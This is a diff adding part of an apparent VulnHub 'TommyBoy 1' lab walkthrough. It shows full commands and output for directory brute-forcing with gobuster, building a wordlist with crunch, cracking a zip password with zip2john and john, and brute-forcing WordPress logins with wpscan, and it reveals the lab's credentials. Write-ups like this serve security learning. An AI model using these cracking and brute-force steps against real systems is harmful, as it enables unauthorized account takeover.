@@ -79,7 +79,217 @@ Exif Image Width                : 1600&#13;&#10;Exif Image Height               
         </ul>
     </ul>
 
-    <li>First I login the the FTP server.  The credentials turn out to be nickburns:nickburns.  On the FTP server is file named readme.txt.  I download it.  It reveals a directory that works as a dropbox named "NickIzL33t".  Big Tom's passwords are in there.</li>
+    <li>First I login the the FTP server.  The credentials turn out to be nickburns:nickburns.  On the FTP server is file named readme.txt.  I download it.  It reveals a directory that works as a dropbox named "NickIzL33t".  It also says I should be able to find Big Tom's password in that directory.  I browse to the dropbox on port 8008 but I hit a roadblock</li>
+
+    <br>
+
+    <li> The web page just says</li>
+
+    <pre>
+Nick's sup3r s3cr3t dr0pb0x - only me and Steve Jobs can see this content
+Lol
+    </pre>
+
+    <li>Thinking back to the readme.txt that I downloaded from the FTP server, it mentioned looking at files from this website on your phone.  So I used burp to intercept web requests and change my user agent to make it look like I am browsing from a phone.</li>
+
+    <img src="../images/tommyboy1/ios_useragent.png">
+
+    <li>Now when I browse to http://10.0.0.22:8008/NickIzL33t/ I get text saying</li>
+    
+    <pre>
+Well, you passed the dummy test
+But Nick's secret door isn't that easy to open.
+Gotta know the EXACT name of the .html to break into this fortress.
+Good luck brainiac.
+Lol
+-Nick 
+    </pre>
+
+    <li>I used gobuster to find the .html file name.  I used a few different wordlists before landing on rockyou.txt.  I also setup gobuster to with the user-agent to identify as a cell phone (iphone in this case).</li>
+
+    <pre>
+┌──(kali㉿kali)-[~/Documents/VulnHub/TommyBoy_1/WebEnum]
+└─$ gobuster dir -u http://10.0.0.22:8008/NickIzL33t/ -w /usr/share/wordlists/rockyou.txt -x html -a "User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 5_1 like Mac OS X) AppleWebKit/534.46 (KHTML, like Gecko) Version/5.1 Mobile/9B176 Safari/7534.48.3" | tee nickisl33t
+===============================================================
+Gobuster v3.1.0
+by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
+===============================================================
+[+] Url:                     http://10.0.0.22:8008/NickIzL33t/
+[+] Method:                  GET
+[+] Threads:                 10
+[+] Wordlist:                /usr/share/wordlists/rockyou.txt
+[+] Negative Status codes:   404
+[+] User Agent:              User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 5_1 like Mac OS X) AppleWebKit/534.46 (KHTML, like Gecko) Version/5.1 Mobile/9B176 Safari/7534.48.3
+[+] Extensions:              html
+[+] Timeout:                 10s
+===============================================================
+2021/09/27 20:28:00 Starting gobuster in directory enumeration mode
+===============================================================
+Progress: 6644 / 28688786 (0.02%)[ERROR] 2021/09/27 20:28:01 [!] parse "http://10.0.0.22:8008/NickIzL33t/!@#$%^": invalid URL escape "%^"
+Progress: 40776 / 28688786 (0.14%)[ERROR] 2021/09/27 20:28:03 [!] parse "http://10.0.0.22:8008/NickIzL33t/!\"£$%^": invalid URL escape "%^"
+Progress: 47376 / 28688786 (0.17%)[ERROR] 2021/09/27 20:28:04 [!] parse "http://10.0.0.22:8008/NickIzL33t/!@#$%^&*()": invalid URL escape "%^&"
+/??????.html          (Status: 200) [Size: 270]
+/??????               (Status: 200) [Size: 270]
+Progress: 67280 / 28688786 (0.23%)            [ERROR] 2021/09/27 20:28:06 [!] parse "http://10.0.0.22:8008/NickIzL33t/100%sexy": invalid URL escape "%se"
+[ERROR] 2021/09/27 20:28:06 [!] parse "http://10.0.0.22:8008/NickIzL33t/100%angel": invalid URL escape "%an"
+Progress: 73806 / 28688786 (0.26%)            [ERROR] 2021/09/27 20:28:06 [!] parse "http://10.0.0.22:8008/NickIzL33t/!@#$%^&*": invalid URL escape "%^&"
+Progress: 80402 / 28688786 (0.28%)            [ERROR] 2021/09/27 20:28:06 [!] parse "http://10.0.0.22:8008/NickIzL33t/100%bitch": invalid URL escape "%bi"
+///////               (Status: 200) [Size: 270]
+///////.html          (Status: 403) [Size: 94] 
+Progress: 106792 / 28688786 (0.37%)           [ERROR] 2021/09/27 20:28:08 [!] parse "http://10.0.0.22:8008/NickIzL33t/!@#$%^&*(": invalid URL escape "%^&"
+Progress: 119898 / 28688786 (0.42%)           [ERROR] 2021/09/27 20:28:09 [!] parse "http://10.0.0.22:8008/NickIzL33t/100%me": invalid URL escape "%me"
+Progress: 133056 / 28688786 (0.46%)           [ERROR] 2021/09/27 20:28:11 [!] parse "http://10.0.0.22:8008/NickIzL33t/100%cute": invalid URL escape "%cu"
+Progress: 139692 / 28688786 (0.49%)           [ERROR] 2021/09/27 20:28:11 [!] parse "http://10.0.0.22:8008/NickIzL33t/!@#$%^&": invalid URL escape "%^&"
+[ERROR] 2021/09/27 20:28:11 [!] parse "http://10.0.0.22:8008/NickIzL33t/!@#$%": invalid URL escape "%"
+Progress: 152810 / 28688786 (0.53%)           [ERROR] 2021/09/27 20:28:12 [!] parse "http://10.0.0.22:8008/NickIzL33t/100%love": invalid URL escape "%lo"
+[ERROR] 2021/09/27 20:28:12 [!] parse "http://10.0.0.22:8008/NickIzL33t/!\"£$%^&*()": invalid URL escape "%^&"
+Progress: 172212 / 28688786 (0.60%)           [ERROR] 2021/09/27 20:28:13 [!] parse "http://10.0.0.22:8008/NickIzL33t/100%cool": invalid URL escape "%co"
+/fallon1.html         (Status: 200) [Size: 459]
+Progress: 205096 / 28688786 (0.71%)           [ERROR] 2021/09/27 20:28:16 [!] parse "http://10.0.0.22:8008/NickIzL33t/100%real": invalid URL escape "%re"
+    </pre>
+
+    <li>The output is a little messy but I watched the output until an interesting status 200 returned.  fallon1.html turns out to be the correct .html file name.</li>
+    
+    <br>
+
+    <li>http://10.0.0.22:8008/NickIzL33t/ we are presented with a few different links</li>
+    <ul>
+        <li>http://10.0.0.22:8008/NickIzL33t/hint.txt</li>
+        <ul>
+            <li>Gives us the criteria required for Big Tom's password</li>
+            <ul>
+                <li>Starts with "bev"</li>
+                <li>One uppercase character</li>
+                <li>Two numbers</li>
+                <li>Two lowercase characters</li>
+                <li>One symbol</li>
+                <li>The year Tommy boy came out in theaters (1995)</li>
+            </ul>
+        </ul>
+        <li>http://10.0.0.22:8008/NickIzL33t/flagtres.txt</li>
+        <ul>
+            <li>The 3rd flag</li>
+        </ul>
+        <li>http://10.0.0.22:8008/NickIzL33t/t0msp4ssw0rdz.zip</li>
+        <ul>
+            <li>The encrypted backup file</li>
+        </ul>
+    </ul>
+
+    <li>First I download t0msp4ssw0rdz.zip and then I generate a wordlist, based on the criteria given, to crack the zip file password.  I used the tool crunch to generate the list.</li>
+    
+    <pre>
+&boxdr;&HorizontalLine;&HorizontalLine;(kali&#12927;kali)-[~/Documents/VulnHub/TommyBoy_1]&#13;&#10;&boxur;&HorizontalLine;$ crunch 13 13 -t bev,%%@@^1995 -o pass.lst                                                                                                              130 &Cross;
+    </pre>
+
+    <li>Then I used zip2john to generate a password hash to crack.</li>
+
+    <pre>
+&boxdr;&HorizontalLine;&HorizontalLine;(kali&#12927;kali)-[~/Documents/VulnHub/TommyBoy_1/exfiltrated]&#13;&#10;&boxur;&HorizontalLine;$ zip2john t0msp4ssw0rdz.zip &gt; pass_hash&#13;&#10;ver 2.0 efh 5455 efh 7875 t0msp4ssw0rdz.zip/passwords.txt PKZIP Encr: 2b chk, TS_chk, cmplen=332, decmplen=641, crc=DF15B771
+    </pre>
+
+    <li>After creating the hash, I use john to crack the hash while using the password list generated by crunch as the wordlist</li>
+
+    <pre>
+&boxdr;&HorizontalLine;&HorizontalLine;(kali&#12927;kali)-[~/Documents/VulnHub/TommyBoy_1]&#13;&#10;&boxur;&HorizontalLine;$ john --wordlist=pass.lst pass_hash&#13;&#10;Using default input encoding: UTF-8&#13;&#10;Loaded 1 password hash (PKZIP [32/64])&#13;&#10;Will run 4 OpenMP threads&#13;&#10;Press &apos;q&apos; or Ctrl-C to abort, almost any other key for status&#13;&#10;bevH00tr$1995    (t0msp4ssw0rdz.zip/passwords.txt)&#13;&#10;1g 0:00:00:01 DONE (2021-09-28 09:51) 0.7751g/s 12122Kp/s 12122Kc/s 12122KC/s bevH00re{1995..bevH01as&apos;1995&#13;&#10;Use the &quot;--show&quot; option to display all of the cracked passwords reliably&#13;&#10;Session completed
+    </pre>
+
+    <li>The password bevH00tr$1995 is revelead.  We can now unzip and read the encrypted password file.</li>
+
+    <pre>
+&boxdr;&HorizontalLine;&HorizontalLine;(kali&#12927;kali)-[~/Documents/VulnHub/TommyBoy_1/exfiltrated]&#13;&#10;&boxur;&HorizontalLine;$ cat passwords.txt &#13;&#10;Sandusky Banking Site&#13;&#10;------------------------&#13;&#10;Username: BigTommyC&#13;&#10;Password: money&#13;&#10;&#13;&#10;TheKnot.com (wedding site)&#13;&#10;---------------------------&#13;&#10;Username: TomC&#13;&#10;Password: wedding&#13;&#10;&#13;&#10;Callahan Auto Server&#13;&#10;----------------------------&#13;&#10;Username: bigtommysenior&#13;&#10;Password: fatguyinalittlecoat&#13;&#10;&#13;&#10;Note: after the &quot;fatguyinalittlecoat&quot; part there are some numbers, but I don&apos;t remember what they are.&#13;&#10;However, I wrote myself a draft on the company blog with that information.&#13;&#10;&#13;&#10;Callahan Company Blog&#13;&#10;----------------------------&#13;&#10;Username: bigtom(I think?)&#13;&#10;Password: ??? &#13;&#10;Note: Whenever I ask Nick what the password is, he starts singing that famous Queen song.
+    </pre>
+
+    <li>The takeaway here, is that we need to get into Tom's wordpress account in order to find the numbers that go after his server (ssh?) password.  The Queen song that the password file hints at is "We Will Rock You" which leads us to rockyou.txt for our password list.  I run wpscan twice to get the valid credentials.  The first time I run it without a user list so that wpscan enumerates users for me.</li>
+
+    <pre>
+┌──(kali㉿kali)-[~/Documents/VulnHub/TommyBoy_1]
+└─$ wpscan --url http://10.0.0.22/prehistoricforest/ -P /usr/share/wordlists/rockyou.txt 
+_______________________________________________________________
+         __          _______   _____
+         \ \        / /  __ \ / ____|
+          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
+           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
+            \  /\  /  | |     ____) | (__| (_| | | | |
+             \/  \/   |_|    |_____/ \___|\__,_|_| |_|
+
+         WordPress Security Scanner by the WPScan Team
+                         Version 3.8.18
+       Sponsored by Automattic - https://automattic.com/
+       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
+_______________________________________________________________
+
+                    (Lines Removed)
+
+[+] Enumerating Users (via Passive and Aggressive Methods)
+ Brute Forcing Author IDs - Time: 00:00:00 <======================================> (10 / 10) 100.00% Time: 00:00:00
+
+[i] User(s) Identified:
+
+[+] tommy
+ | Found By: Author Posts - Author Pattern (Passive Detection)
+ | Confirmed By:
+ |  Author Id Brute Forcing - Author Pattern (Aggressive Detection)
+ |  Login Error Messages (Aggressive Detection)
+
+[+] richard
+ | Found By: Author Posts - Author Pattern (Passive Detection)
+ | Confirmed By:
+ |  Rss Generator (Passive Detection)
+ |  Author Id Brute Forcing - Author Pattern (Aggressive Detection)
+ |  Login Error Messages (Aggressive Detection)
+
+[+] tom
+ | Found By: Author Posts - Author Pattern (Passive Detection)
+ | Confirmed By:
+ |  Author Id Brute Forcing - Author Pattern (Aggressive Detection)
+ |  Login Error Messages (Aggressive Detection)
+
+[+] Tom Jr.
+ | Found By: Rss Generator (Passive Detection)
+
+[+] Big Tom
+ | Found By: Rss Generator (Passive Detection)
+
+[+] michelle
+ | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)
+ | Confirmed By: Login Error Messages (Aggressive Detection)
+
+[+] Performing password attack on Wp Login against 6 user/s
+^Cying Tom Jr. / kiss Time: 00:09:58 <                                    > (92405 / 86066352)  0.10%  ETA: ??:??:??
+[i] No Valid Passwords Found.
+
+[!] No WPScan API Token given, as a result vulnerability data has not been output. / 86066352)  0.10%  ETA: ??:??:??
+[!] You can get a free API token with 25 daily requests by registering at https://wpscan.com/register
+
+[+] Finished: Tue Sep 28 10:49:48 2021
+[+] Requests Done: 92577
+[+] Cached Requests: 39
+[+] Data Sent: 49.071 MB
+[+] Data Received: 339.861 MB
+[+] Memory used: 303.793 MB
+[+] Elapsed time: 00:10:03
+
+Scan Aborted: Canceled by User
+    </pre>
+
+    <li>It takes too long to brute force against all of the users that were enumerated so I take "big tom" and "tom" and put them in a user list so I am only brute forcing against those two usernames.  The other usernames do not seem like they would apply to Tom Sr., which is who's account we are trying to access.  So I run wordpress again using this username list and I get valid credentials.</li>
+
+    <pre>
+&boxdr;&HorizontalLine;&HorizontalLine;(kali&#12927;kali)-[~/Documents/VulnHub/TommyBoy_1]&#13;&#10;&boxur;&HorizontalLine;$ wpscan --url http://10.0.0.22/prehistoricforest/ -P /usr/share/wordlists/rockyou.txt -U ./users.lst         2 &Cross;&#13;&#10;_______________________________________________________________&#13;&#10;         __          _______   _____&#13;&#10;         \ \        / /  __ \ / ____|&#13;&#10;          \ \  /\  / /| |__) | (___   ___  __ _ _ __ &reg;&#13;&#10;           \ \/  \/ / |  ___/ \___ \ / __|/ _` | &apos;_ \&#13;&#10;            \  /\  /  | |     ____) | (__| (_| | | | |&#13;&#10;             \/  \/   |_|    |_____/ \___|\__,_|_| |_|&#13;&#10;&#13;&#10;         WordPress Security Scanner by the WPScan Team&#13;&#10;                         Version 3.8.18&#13;&#10;       Sponsored by Automattic - https://automattic.com/&#13;&#10;       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart&#13;&#10;_______________________________________________________________&#13;&#10;&#13;&#10;                (Lines Removed)&#13;&#10;&#13;&#10;[+] Performing password attack on Wp Login against 2 user/s&#13;&#10;[SUCCESS] - tom / tomtom1                                                                                           &#13;&#10;^Cying big tom / 210491 Time: 00:05:28 &lt;                                  &gt; (53196 / 28713447)  0.18%  ETA: 49:12:52&#13;&#10;[!] Valid Combinations Found:&#13;&#10; | Username: tom, Password: tomtom1
+    </pre>
+
+    <li>Now we can login to http://10.0.0.22/prehistoricforest/wp-login.php with tom:tomtom1 and read his drafts to see which numbers come after his SSH password.</li>
+
+    <img src="../images/tommyboy1/wp_draft.png">
+
+    <br>
+    <br>
+
+    
+
+
+
     <br>
     <h2><a id="foothold">Foothold</a></h2>
 
